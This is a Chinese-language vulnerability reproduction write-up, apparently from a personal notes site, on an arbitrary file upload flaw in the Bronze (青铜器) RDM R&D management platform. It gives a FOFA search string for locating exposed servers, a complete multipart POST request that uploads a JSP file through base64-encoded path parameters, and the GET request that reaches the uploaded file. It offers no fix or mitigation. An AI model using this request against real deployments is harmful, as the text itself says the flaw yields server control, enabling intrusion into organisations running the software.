# 青铜器RDM研发管理平台upload存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">深圳市青铜器软件系统有限公司,创业团队一直专注于提供产品创新和研发管理整体解决方案。公司在深入研究企业研发管理信息化需求的基础上，开发出针对完全拥有自主知识产权的研发管理软件RDM系列版本。青铜器RDM研发管理平台upload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 青铜器RDM研发管理平台

# 三、资产测绘
+ fofa`body="/images/rdm.ico"`
+ 特征

![1712747446071-d672a11c-d403-40f5-ac90-89531045ad74.png](./img/uHZ6EwiBMeFVWmE3/1712747446071-d672a11c-d403-40f5-ac90-89531045ad74-317515.png)

# 四、漏洞复现
```java
POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Cookie: JSESSIONID=AB3CC11444E566879F70BE78C0C518CA
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 260
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream

<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="Submit"

Go
--00content0boundary00--
```

![1712747466309-473fb061-9d40-499b-bffc-ddd89079dc84.png](./img/uHZ6EwiBMeFVWmE3/1712747466309-473fb061-9d40-499b-bffc-ddd89079dc84-945013.png)

文件上传位置

```java
GET /repository/000000000/demo.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![1712747538656-73854cfa-7c54-4377-96b2-1f5665114773.png](./img/uHZ6EwiBMeFVWmE3/1712747538656-73854cfa-7c54-4377-96b2-1f5665114773-676572.png)



> 更新: 2024-04-20 22:03:39  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lz5wvm37m8hz8p64>